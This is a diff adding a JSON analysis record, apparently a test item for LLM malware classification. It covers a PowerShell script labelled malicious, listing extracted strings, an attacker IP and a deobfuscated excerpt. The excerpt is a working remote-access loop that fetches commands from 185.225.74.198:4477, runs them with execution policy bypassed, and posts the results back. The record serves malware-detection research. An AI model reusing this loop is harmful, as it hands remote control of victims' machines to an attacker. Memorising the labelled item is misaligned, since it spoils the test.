@@ -1,0 +1,88 @@
+{
+  "meta": {
+    "quelldatei": "0352f8641a0a894364b873dccc2738ef9fa6dd606c95fc9db08392238cffe899.ps1",
+    "sha256": "0352f8641a0a894364b873dccc2738ef9fa6dd606c95fc9db08392238cffe899",
+    "groesse_bytes": 558,
+    "zeilen": 2,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "185.225.74.198:4477",
+      "add29918-6263f3e6-2f810c1e",
+      "http://",
+      "C:Users1$env:update.ps1",
+      "M -useb -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(I",
+      "RM -useb -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq ",
+      ") {del $f;exit} elseif ($c -ne ",
+      ") {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -EA Stop -EV e;$r=Out-String -InputObject $r;$t=IR",
+      "M -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join "
+    ],
+    "string_anzahl_gesamt": 9,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "185.225.74.198:4477",
+      "add29918-6263f3e6-2f810c1e",
+      "http://",
+      "C:Users1$env:update.ps1",
+      "M -useb -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(I",
+      "RM -useb -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq ",
+      ") {del $f;exit} elseif ($c -ne ",
+      ") {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -EA Stop -EV e;$r=Out-String -InputObject $r;$t=IR",
+      "M -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join "
+    ],
+    "string_anzahl_gesamt": 9,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Out-String"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [
+        "185.225.74.198"
+      ],
+      "pfade": [
+        "$env:update"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "185.225.74.198:4477",
+      "add29918-6263f3e6-2f810c1e",
+      "http://",
+      "C:Users1$env:update.ps1",
+      "M -useb -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(I",
+      "RM -useb -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq ",
+      ") {del $f;exit} elseif ($c -ne ",
+      ") {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -EA Stop -EV e;$r=Out-String -InputObject $r;$t=IR",
+      "M -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join "
+    ],
+    "string_anzahl_gesamt": 9,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Out-String"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [
+        "185.225.74.198"
+      ],
+      "pfade": [
+        "$env:update"
+      ]
+    },
+    "deobfuskiert_auszug": "$s='185.225.74.198:4477';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:Users1$env:update.ps1\";$v=I''R''M -useb -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(I''RM -useb -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -EA Stop -EV e;$r=Out-String -InputObject $r;$t=IR''M -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 1.9}\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
